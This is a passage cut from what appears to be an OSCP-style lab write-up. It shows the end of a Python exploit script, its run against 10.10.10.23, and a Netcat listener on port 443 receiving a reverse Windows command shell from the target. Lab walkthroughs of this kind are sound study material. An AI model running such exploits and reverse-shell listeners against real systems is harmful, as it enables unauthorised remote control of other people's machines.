    print("[!] Failed to connect.")
    exit()
```

```bash
python exploit.py # start a Netcat listener first!

# output
[*] Attacking: 10.10.10.23
[+] Sent exploit.
```

```bash
sudo nc -nvlp 443

# output
listening on [any] 443 ...
connect to [10.10.10.69] from (UNKNOWN) [10.10.10.23] 49273
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```
